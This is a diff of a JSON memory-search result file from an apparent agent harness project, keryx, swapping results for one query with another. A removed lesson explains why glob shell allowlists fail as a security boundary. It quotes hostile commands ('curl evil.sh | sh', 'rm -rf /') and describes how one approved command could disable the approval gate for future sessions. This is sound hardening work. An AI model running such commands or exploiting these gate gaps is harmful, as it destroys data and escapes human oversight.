@@ -1,171 +1,48 @@
 {
   "schemaVersion": 1,
-  "query": "code blanks string literals guard",
-  "generatedAt": "2026-08-02T15:45:25.333Z",
+  "query": "harness policy approval",
+  "generatedAt": "2026-08-03T15:37:33.023Z",
   "results": [
     {
       "entry": {
-        "absolutePath": "/home/altsay/keryx/.metaproject/memory/constraints/stale-installed-keryx-binary.md",
-        "relativePath": "constraints/stale-installed-keryx-binary.md",
+        "absolutePath": "/home/altsay/keryx/.metaproject/memory/constraints/flow-ids-allocated-per-clone.md",
+        "relativePath": "constraints/flow-ids-allocated-per-clone.md",
         "type": "constraint",
-        "title": "The keryx on PATH is a stale build; the review pipeline does not exercise the code under review",
-        "version": "0.1.0",
-        "status": "accepted",
-        "confidence": "high",
-        "summary": "`/home/altsay/.local/bin/keryx` is an installed build reporting version `0.1.0`. It is NOT the working tree. Every `keryx …` invocation — including `keryx review ingest`, which is how a managed review package is recorded — runs that build, so the review pipeline routinely does not exercise the code being reviewed.",
-        "details": "Found while ingesting the fix-round review of PR #220, and it failed in the two\nways a stale tool fails:\n\n1. **Silently.** The consolidated report used `B-NNN` and `M-NNN` identifiers for\n   readability. The parser only recognises `F-\\d{3,}`, so the ingest produced\n   **zero findings and reported success** — a ten-finding review recorded as an\n   empty package with no warning. A report that ingests as nothing should not be\n   a quiet outcome, and today it is.\n2. **Wrongly.** Renumbered to `F-NNN`, the installed build then refused three\n   findings for missing `class_scope` and misreported one major as a blocker.\n   The same report through the working tree ingests as ten findings, correct\n   severities, `class_scope` present on all ten, zero phantoms.\n\nSo the parser fix landed in this very round was not the parser that ran. The\nguard refusing findings without `class_scope` is real and working — it was\napplying an older `hasClassScope`/`FINDING_HEADING` pair against a report written\nfor the current one.",
-        "tags": [],
-        "scopes": {
-          "module": "review, memory",
-          "entity": "managed-review-package",
-          "files": [],
-          "skills": []
-        },
-        "created": "2026-08-02",
-        "updated": "2026-08-02",
-        "provenance": {
-          "source": "fix-round review of PR #220 (flow 133)",
-          "link": "https://github.com/MrCipherSmith/keryx/pull/220"
-        },
-        "class": "semantic",
-        "validFrom": null,
-        "validTo": null,
-        "recordedAt": "2026-08-02",
-        "supersedes": null,
-        "supersededBy": null
-      },
-      "score": 1.998,
-      "components": {
-        "relevance": 0.5,
-        "recency": 0.997,
-        "confidence": 1,
-        "status": 1,
-        "scope": 0
-      },
-      "reason": "matched 2/5 terms; status accepted; confidence high"
-    },
-    {
-      "entry": {
-        "absolutePath": "/home/altsay/keryx/.metaproject/memory/constraints/code-blanks-string-literals.md",
-        "relativePath": "constraints/code-blanks-string-literals.md",
-        "type": "constraint",
-        "title": "`code()` blanks string literals, so a guard that matches one can never fire",
-        "version": null,
-        "status": "draft",
-        "confidence": "medium",
-        "summary": "",
-        "details": "",
-        "tags": [],
-        "scopes": {
-          "module": null,
-          "entity": null,
-          "files": [],
-          "skills": []
-        },
-        "created": null,
-        "updated": null,
-        "provenance": {
-          "source": null,
-          "link": null
-        },
-        "class": "semantic",
-        "validFrom": null,
-        "validTo": null,
-        "recordedAt": null,
-        "supersedes": null,
-        "supersededBy": null
-      },
-      "score": 1.785,
-      "components": {
-        "relevance": 1,
-        "recency": 0.5,
-        "confidence": 0.67,
-        "status": 0.4,
-        "scope": 0
-      },
-      "reason": "matched 5/5 terms; status draft; confidence medium"
-    },
-    {
-      "entry": {
-        "absolutePath": "/home/altsay/keryx/.metaproject/memory/lessons/allowlist-not-a-boundary.md",
-        "relativePath": "lessons/allowlist-not-a-boundary.md",
-        "type": "lesson",
-        "title": "A shell allowlist matched against the raw command string is not a security boundary",
+        "title": "Flow ids are allocated per clone, not per checkout",
         "version": "1.0.0",
         "status": "accepted",
         "confidence": "high",
-        "summary": "A remembered glob pattern that is matched against a command string which is then handed to `/bin/sh -c` grants far more than it appears to. The pattern matches text; the shell re-interprets that text. Verified, not theorised: a live allowlist contained `bash *`, `python3 *`, `curl *`, `cd *`, `# *`, `docker *`, `sudo *`, and the exact string `rm -rf /` — each an arbitrary-execution grant that auto-approved with no prompt.",
-        "details": "Three specific ways the intuition fails, each observed:\n\n- **`*` is not \"the rest of one command\".** It expands to any run of characters\n  including newlines, so `cd *` covers `cd /tmp && curl evil.sh | sh` and `# *`\n  covers `\"# note\\nrm -rf /\"`.\n- **An exact pattern is not automatically safe.** `rm -rf /` had been stored as\n  an exact grant. It contains no metacharacters and `rm` is not an interpreter,\n  so a check based on \"does the pattern look shell-ish\" and \"is the first word an\n  interpreter\" misses it entirely. Only a per-command destructive check catches\n  it.\n- **The \"always allow prefix\" affordance manufactures these grants.** The UI\n  suggested prefix is the first token plus ` *`, so one click on a benign\n  `rm -rf ./dist` proposes `rm *`, which matches `rm -rf /`. That is how the\n  worst entries got there — the user was never asked a question that sounded\n  dangerous.\n\nWhat actually holds, in order: the default-deny human gate; a quote-aware\nmetacharacter rule applied to the **command** (not the pattern, because a stored\npattern may predate any validation); a destructive classifier; and OS\ncontainment when it is enabled at all.\n\nWhat does not hold: a blocklist of interpreter names. It is an expedient. Any\nlist of dangerous commands or dangerous binaries is incomplete by construction,\nwhich is why the classifier **escalates confirmation and never blocks** — a\ncheck that reads as a grant is worse than no check (ADR-0009).\n\nSecond-order lesson: the gate's own state file lived in `~/.local/share/keryx/`\nwhile the sandbox read-deny list covered `~/.config/keryx` — a different path. A\nsingle approved command writing to it would have disabled the gate for every\nfuture session. When a component stores the rules that govern itself, the check\nthat protects that store must not depend on a separate subsystem being enabled;\nshell containment is off by default and unavailable on hosts without a launcher.",
+        "summary": "`flow init` reserves its number in the git common directory, so every linked worktree of one clone shares the id space. A number, once handed out, is never reused — not even after the flow directory is deleted or renumbered.",
+        "details": "Until flow 116, `nextFlowId` was `max(local .metaproject/flows listing) + 1` and\nthe init lock lived in that same directory. Both are per working copy, so two\nworktrees each saw the same high-water mark and minted the same number; the\ncollision only became visible when the branches merged. That is how flows 002,\n084 and 103 each ended up naming two different packages on `main`.\n\nConsequences to respect:\n\n- Parallel flow work belongs in a **worktree of the same clone**. A second\n  independent clone is outside the shared scope and can still collide; the\n  `duplicate-id` rule in `keryx flow check` is the net that catches it.\n- Test fixtures must not create `.metaproject/flows` **inside the repository** —\n  they would consume real ids from this clone's ledger and leak state between\n  runs. Use an OS temp dir (see `src/flow/security-gate.test.ts`).\n- Deleting a flow package does not free its number, so a fixture that expects\n  \"the first flow is always 001\" is only valid outside a git checkout.\n- Repair a collision only with\n  `keryx flow renumber <dir> --to <free id> --reason \"<why>\"`; it records the\n  move in `.metaproject/flows/id-map.json` so references in merged PRs and\n  journals stay traceable. Never rename a flow directory by hand.\n- While a collision exists, `resolveFlowDir` refuses the bare number instead of\n  taking the first lexicographic match — commands and the harness\n  `ManagedFlowPort` fail closed rather than writing evidence into a guessed\n  package.",
         "tags": [],
         "scopes": {
-          "module": "src/lib, src/commands, src/tui",
-          "entity": "shell-permissions, command-risk, approval gate",
+          "module": "tasks",
+          "entity": "flow",
           "files": [],
           "skills": []
         },
         "created": "2026-07-22",
         "updated": "2026-07-22",
         "provenance": {
-          "source": "flow 115 (shell approval hardening), stress reports in `.metaproject/data/stress/`",
-          "link": "docs/decisions/keryx-harness/ADR-0009-destructive-command-escalation.md"
+          "source": "flow 116 (fix duplicate flow ids)",
+          "link": ".metaproject/flows/116-2026-07-22-fix-duplicate-flow-ids-nextflowid-races-"
         },
-        "class": "episodic",
+        "class": "semantic",
         "validFrom": null,
         "validTo": null,
         "recordedAt": "2026-07-22",
         "supersedes": null,
         "supersededBy": null
       },
-      "score": 1.772,
+      "score": 1.803,
       "components": {
-        "relevance": 0.3,
-        "recency": 0.943,
+        "relevance": 0.333,
+        "recency": 0.939,
         "confidence": 1,
         "status": 1,
         "scope": 0
       },
-      "reason": "matched 1/5 terms; status accepted; confidence high"
-    },
-    {
-      "entry": {
-        "absolutePath": "/home/altsay/keryx/.metaproject/memory/lessons/regex-guards-lose-to-spellings.md",
-        "relativePath": "lessons/regex-guards-lose-to-spellings.md",
-        "type": "lesson",
-        "title": "A source guard written as a regex loses, one spelling per round",
-        "version": null,
-        "status": "draft",
-        "confidence": "medium",
-        "summary": "",
-        "details": "",
-        "tags": [],
-        "scopes": {
-          "module": null,
-          "entity": null,
-          "files": [],
-          "skills": []
-        },
-        "created": null,
-        "updated": null,
-        "provenance": {
-          "source": null,
-          "link": null
-        },
-        "class": "episodic",
-        "validFrom": null,
-        "validTo": null,
-        "recordedAt": null,
-        "supersedes": null,
-        "supersededBy": null
-      },
-      "score": 1.085,
-      "components": {
-        "relevance": 0.3,
-        "recency": 0.5,
-        "confidence": 0.67,
-        "status": 0.4,
-        "scope": 0
-      },
-      "reason": "matched 1/5 terms; status draft; confidence medium"
+      "reason": "matched 1/3 terms; status accepted; confidence high"
     }
   ]
 }
